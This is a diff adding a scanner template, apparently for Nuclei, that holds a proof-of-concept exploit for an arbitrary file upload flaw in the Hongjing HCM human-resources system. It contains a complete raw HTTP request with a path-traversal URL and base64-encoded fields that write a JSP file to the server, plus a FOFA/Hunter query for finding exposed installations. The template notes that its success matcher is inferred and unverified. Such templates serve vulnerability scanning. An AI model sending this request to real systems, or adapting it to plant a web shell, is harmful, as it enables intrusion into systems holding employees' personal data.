@@ -1,0 +1,61 @@
+id: poc-31a1fa2710521b198717
+info:
+  name: 宏景人力资源信息管理系统customreport存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/31a1fa2710521b198717cfc09fab212b
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 31a1fa2710521b198717cfc09fab212b
+    fofa: + hunter`app.name="宏景 HCM"`
+http:
+- raw:
+  - 'POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Length: 417
+
+
+    DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
+
+    OPTION=U0FWRUZJTEU=
+
+    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+
+    FILETYPE=Li5cMW5kZXguanNw
+
+    RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+
+    originalFileId=wV66
+
+    originalCreateDate=wUghPB3szB3Xwg66
+
+    FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
+
+    needReadFile=yRWZdAS6
+
+    originalCreateDate=wLSGP4oEzLKAz4=iz=6
+
+
+    <% out.print("123");%>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
